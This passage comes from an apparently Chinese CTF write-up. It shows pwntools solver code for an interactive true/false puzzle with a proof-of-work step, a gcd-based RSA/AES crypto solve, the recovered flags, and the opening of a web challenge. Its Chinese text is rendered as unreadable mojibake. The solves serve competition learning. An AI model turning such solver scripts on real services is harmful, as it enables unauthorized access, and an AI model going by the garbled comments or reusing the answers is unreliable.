</span></span></span><span class="line"><span class="cl"><span class="s2">    è§‚æµ‹åˆ° 17 ä¸ª True/Falseï¼ˆå…¶ä¸­æ°æœ‰ 2 æ¬¡åè½¬ï¼‰ï¼Œåœ¨ 256 ä¸ªå€™é€‰ä¸­é€‰å‡ºâ€œçŸ›ç›¾æœ€å°‘â€çš„ assignmentï¼ˆè‹¥å¤šè§£å–ç¬¬ä¸€ä¸ªï¼‰
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">best</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">best_dist</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">30</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">assign</span> <span class="o">=</span> <span class="p">[(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">)]</span>  <span class="c1"># ä½ä½å¯¹åº” S0</span>
</span></span><span class="line"><span class="cl">        <span class="n">pred</span> <span class="o">=</span> <span class="n">predict_answers</span><span class="p">(</span><span class="n">assign</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">dist</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">pa</span> <span class="o">!=</span> <span class="n">oa</span> <span class="k">for</span> <span class="n">pa</span><span class="p">,</span> <span class="n">oa</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">pred</span><span class="p">,</span> <span class="n">observed_answers</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">dist</span> <span class="o">&lt;</span> <span class="n">best_dist</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">best_dist</span> <span class="o">=</span> <span class="n">dist</span>
</span></span><span class="line"><span class="cl">            <span class="n">best</span> <span class="o">=</span> <span class="n">assign</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">best_dist</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ç†è®ºä¸Š best_dist åº” â‰¤ 2ï¼›ä½†å³ä½¿ 2 è°æ°å¥½â€œç¢°æ’â€ï¼Œæˆ‘ä»¬ä¾ç„¶å–æœ€è¿‘é‚»</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">best</span><span class="p">,</span> <span class="n">best_dist</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_bool_line</span><span class="p">(</span><span class="n">line</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    è§£æ &#34;Prisoner&#39;s response: True!</span><span class="se">\n</span><span class="s2">&#34; / &#34;False!</span><span class="se">\n</span><span class="s2">&#34; ä¹‹ç±»
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">rb</span><span class="s2">&#34;(True|False)&#34;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">m</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;æ— æ³•è§£æè¿”å›ï¼š</span><span class="si">{</span><span class="n">line</span><span class="si">!r}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;True&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">one_round</span><span class="p">(</span><span class="n">io</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    è·‘ä¸€è½®ï¼šå‘ 17 ä¸ªé—®é¢˜ï¼Œæ”¶ 17 ä¸ªç­”å¤ï¼Œç®—å‡º 8 æ¯”ç‰¹å¹¶æäº¤ã€‚æˆåŠŸè¿”å› Trueï¼Œå¤±è´¥ï¼ˆè¢«å½“åœºå˜²ç¬‘ï¼‰è¿”å› Falseã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">qs</span> <span class="o">=</span> <span class="n">all_questions</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">answers</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">q</span> <span class="ow">in</span> <span class="n">qs</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Ask your question:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">q</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># ç´§æ¥ç€ä¼šæœ‰ä¸€è¡Œâ€œPrisoner&#39;s response: X!â€</span>
</span></span><span class="line"><span class="cl">        <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">EOFError</span><span class="p">(</span><span class="s2">&#34;è¿æ¥è¢«å…³é—­æˆ–è¶…æ—¶&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ans</span> <span class="o">=</span> <span class="n">parse_bool_line</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">answers</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># æäº¤ç­”æ¡ˆ</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Now reveal the true secrets&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">assign</span><span class="p">,</span> <span class="n">dist</span> <span class="o">=</span> <span class="n">nearest_assignment</span><span class="p">(</span><span class="n">answers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">submit</span> <span class="o">=</span> <span class="s2">&#34; &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">assign</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">submit</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># è¯»ä¸€è¡Œåˆ¤å®š</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span> <span class="ow">or</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;laughs triumphantly&#34;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># ==== PoW ====</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Give me XXXX: &#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ä¾‹å¦‚ï¼šsha256(XXXX+abcDEF...) == deadbeef...</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">rb</span><span class="s2">&#34;sha256\(XXXX\+(?P&lt;sfx&gt;[A-Za-z0-9]+)\) == (?P&lt;hex&gt;[0-9a-f]</span><span class="si">{64}</span><span class="s2">)&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">m</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;æ²¡æŠ“åˆ° PoW æç¤º&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">suffix</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s2">&#34;sfx&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">t0</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">xxxx</span> <span class="o">=</span> <span class="n">solve_pow</span><span class="p">(</span><span class="n">suffix</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">threads</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">t1</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;PoW solved: </span><span class="si">{</span><span class="n">xxxx</span><span class="si">}</span><span class="s2">  (è€—æ—¶ </span><span class="si">{</span><span class="n">t1</span> <span class="o">-</span> <span class="n">t0</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">s)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">xxxx</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å¯èƒ½ä¼šæœ‰ Notice å’Œæ¬¢è¿è¯</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ç„¶åè¿›å…¥ TURNS=25 è½®</span>
</span></span><span class="line"><span class="cl">    <span class="n">rounds</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># ç­‰å¾…æ¯è½®å¼€å§‹æ—¶çš„æ¬¢è¿æ®µè½ï¼ˆä¸ä¸¥æ ¼åŒ¹é…ï¼Œç›´åˆ°çœ‹åˆ° &#34;Ask your question:&#34;ï¼‰</span>
</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Ask your question:&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># è¿™ä¸€è¡Œå·²ç»åƒæ‰äº†ç¬¬ä¸€å¥æç¤ºï¼Œæ‰€ä»¥å…ˆå‘ä¸€ä¸ª no-op å›é€€ï¼Ÿä¸ï¼Œæˆ‘ä»¬æŠŠå®ƒå½“ä½œç¬¬ 1 ä¸ªé—®ç­”çš„æç¤ºï¼Œç›´æ¥å‘ç¬¬ 1 ä¸ªé—®é¢˜å³å¯ã€‚</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># ç”±äºä¸Šé¢æ¶ˆè€—äº†ä¸€ä¸ª &#34;Ask your question:&#34;, æˆ‘ä»¬è¿™é‡Œéœ€è¦æŠŠç¬¬ä¸€ä¸ªé—®é¢˜å•ç‹¬å‘æ‰ã€‚</span>
</span></span><span class="line"><span class="cl">            <span class="n">qs</span> <span class="o">=</span> <span class="n">all_questions</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">answers</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ˆå·²ç»æœ‰æç¤ºäº†ï¼‰</span>
</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">qs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">ans</span> <span class="o">=</span> <span class="n">parse_bool_line</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">answers</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># ä½™ä¸‹ 16 ä¸ª</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">q</span> <span class="ow">in</span> <span class="n">qs</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
</span></span><span class="line"><span class="cl">                <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Ask your question:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">q</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;!</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="n">ans</span> <span class="o">=</span> <span class="n">parse_bool_line</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">answers</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Now reveal the true secrets&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">assign</span><span class="p">,</span> <span class="n">dist</span> <span class="o">=</span> <span class="n">nearest_assignment</span><span class="p">(</span><span class="n">answers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">submit</span> <span class="o">=</span> <span class="s2">&#34; &#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">assign</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">submit</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># è¯»å›åˆç»“æœ</span>
</span></span><span class="line"><span class="cl">            <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span> <span class="ow">or</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">rounds</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Round </span><span class="si">{</span><span class="n">rounds</span><span class="si">}</span><span class="s2"> done; decoding distance=</span><span class="si">{</span><span class="n">dist</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># å¦‚æœå¤±è´¥ä¼šç›´æ¥é€€å‡ºï¼Œè¿™é‡Œå…œåº•å¤šè¯»å‡ è¡Œçœ‹æœ‰æ²¡æœ‰ flag</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;laughs triumphantly&#34;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># å¯èƒ½è¿˜ä¼šæœ‰ä¸€æ®µç»§ç»­æç¤º</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># æ£€æŸ¥æ˜¯å¦å·²ç»ç»™å‡º flag</span>
</span></span><span class="line"><span class="cl">            <span class="n">more</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span> <span class="ow">or</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">more</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;flag&#34;</span> <span class="ow">in</span> <span class="n">more</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">more</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å°è¯•æŠŠæœ€åçš„è¾“å‡ºéƒ½æ‰“å‡ºæ¥ï¼ˆåŒ…å« flagï¼‰</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">rest</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">1.0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">rest</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">rest</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-4">flag
</h4><p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/8.png"
	width="690"
	height="199"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/8_hu_124fad379fdce8cc.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/8_hu_9d8ca81104134995.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="346"
		data-flex-basis="832px"
	
></p>
<p>flag{e9f1e129-66a1-4439-adf5-81bf936a7b06}</p>
<h2 id="crypto">Crypto
</h2><h3 id="check-little">check-little
</h3><p>Nå’Œcçš„ä½æ•°ä¸€æ ·é•¿ï¼Œé‚£ä¹ˆ key^3 è¿œå¤§äº Nï¼Œå–æ¨¡å c æ˜¯ key^3 mod N,è€ƒè™‘key=pï¼Œç„¶åè§£aeså³å¯ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="mi">18795243691459931102679430418438577487182868999316355192329142792373332586982081116157618183340526639820832594356060100434223256500692328397325525717520080923556460823312550686675855168462443732972471029248411895298194999914208659844399140111591879226279321744653193556611846787451047972910648795242491084639500678558330667893360111323258122486680221135246164012614985963764584815966847653119900209852482555918436454431153882157632072409074334094233788430465032930223125694295658614266389920401471772802803071627375280742728932143483927710162457745102593163282789292008750587642545379046283071314559771249725541879213</span>
</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">10533300439600777643268954021939765793377776034841545127500272060105769355397400380934565940944293911825384343828681859639313880125620499839918040578655561456321389174383085564588456624238888480505180939435564595727140532113029361282409382333574306251485795629774577583957179093609859781367901165327940565735323086825447814974110726030148323680609961403138324646232852291416574755593047121480956947869087939071823527722768175903469966103381291413103667682997447846635505884329254225027757330301667560501132286709888787328511645949099996122044170859558132933579900575094757359623257652088436229324185557055090878651740</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">gcd</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">key_bytes</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">p</span><span class="p">)[:</span><span class="mi">16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x91\x16\x04\xb9\xf0</span><span class="s1">RJ</span><span class="se">\xdd\xf7</span><span class="s1">}</span><span class="se">\x8c</span><span class="s1">W</span><span class="se">\xe7</span><span class="s1">n</span><span class="se">\x81\x8d</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">c1</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s1">&#39;bf87027bc63e69d3096365703a6d47b559e0364b1605092b6473ecde6babeff2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="o">=</span><span class="n">key_bytes</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">iv</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">c1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#b&#39;flag{m_m4y_6e_divIS1b1e_by_p?!}\x01&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå¯†ç âœŒå¸ˆå‚…ä¹Ÿæ˜¯å°½åŠ›äº†ï¼Œè¿˜æœ‰ä¸€é“ezranæ²¡çˆ†å‡ºæ¥ã€‚</p>
<h2 id="web">Web
</h2><h3 id="secretvault">SecretVault
</h3><h4 id="è§£é¢˜æ€è·¯-4">è§£é¢˜æ€è·¯
</h4><p>æ ¹æ®é™„ä»¶ä¸­çš„å®¹å™¨æ­å»ºæœ¬åœ°æœåŠ¡åå®¡è®¡ä»£ç å‘ç°flaskå‰ç«¯çš„è·¯ç”±ã€è‡ªå®šä¹‰å¤´æ˜¯ä¸€ä¸ªéå¸¸æŠ½è±¡çš„ä¸œè¥¿ã€‚</p>
